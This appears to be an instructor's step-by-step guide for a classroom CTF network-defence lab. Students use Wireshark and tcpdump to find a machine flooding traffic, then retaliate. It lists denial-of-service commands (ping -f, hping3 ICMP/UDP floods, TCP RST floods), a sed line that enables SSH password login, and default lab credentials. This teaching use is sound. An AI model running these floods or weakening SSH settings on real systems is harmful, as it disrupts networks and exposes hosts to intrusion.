For the Training session: 

Phase 1: Ping all active hosts on network
Kali 1:
sudo git clone https://github.com/jboyce1/ppsCTF.git
cd /home/kali/ppsCTF/classes/LANgeist/training
sudo python3 icmp_broadcast.py

Now ping with a flag from a different 
Kali 2:
sudo git clone https://github.com/jboyce1/ppsCTF.git
cd /home/kali/ppsCTF/classes/LANgeist/training
sudo python3 icmp_broadcast.py

Ask students to identify and ping flood the kali that is being the bully
They need to open wireshark with sudo wireshark and then look for the conversations: isolate the conversations by applying filters

Wireshark > statistics > conversations > ipv4
Wireshark > statistics > protocol hierarchy
apply vnc filter with !(vnc) in filter bar


Phase 2:
- set up the tcp_udp_icmp_cyberbully.py on an ubuntu-bully box using the ubuntu-victims IP 
Kali 3:
sudo git clone https://github.com/jboyce1/ppsCTF.git
cd /home/kali/ppsCTF/classes/LANgeist/training
nano tcp_udp_icmp_cyberbully.py
adjust ip address to Ubuntu 1 ip address

- install iftop on victim machine
Ubuntu 1:
sudo apt update && sudo apt install -y iftop
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh

have participants ssh into victim computer 
find active connections iftop
find the interet connection using ip addr

find the top connections using iftop
iftop 

sudo tcpdump -i <interface> -q --number | grep -v ssh | grep -v domain
OR 
sudo tcpdump -i <interface> -q --number | grep -Ev "ssh|domain"


sudo tcpdump -i ens5
once you have the device attacked we can try to ping flood attack to bully to see if the the packets decrease in volume:
sudo ping -f -s 65000 <BULLY-IP>

Phase 3: Set up wireshark on local machines to check out the packets
- set up the icmp_broadcast_to_net.py and let it run while getting the students set up on their boxes with wireshark

turn on wireshark and inspect captured packets
Step 1 : open wireshark with sudo 
Step 2: Select Capture > Options > SSH remote capture: sshdump
Step 3a: Add in the IP address and the port # for the device you are trying to capture from
Step 3b: Add in authentication
Username: ubuntu
Password: password
Step 3c: Add in capture data
sudo tcpdump -s 0 -U -n -w - -i ens5 not port 22

now follow the same 
Wireshark > statistics > conversations > ipv4
Wireshark > statistics > protocol hierarchy

read tcp by selecting the tcp packets, right clicking and clicking 'follow stream' 
identify the port number the packet is being sent from:
Below where it says Transmission Control Protocol, Src Port: xxxx
fire away back at the source port with the same protocol as being sent from:

Attacking the attacker
ICMP (ping flood) Overloads bullyâ€™s ICMP traffic

ping -f -s 65507 <bully-ip>
hping3 --flood --icmp <bully-ip>
TCP RST attack: Closes TCP connections on specific ports

hping3 --rst -p <port#> -c 10000 <bully-ip>
iptables -A OUTPUT -p tcp --dport <port#> -d <bully-ip> -j DROP
UDP attack: Overload and Block

hping3 --flood --udp -p <port#> <bully-ip>
iptables -A INPUT -p udp --sport <port#> -s <bully-ip> -j DROP
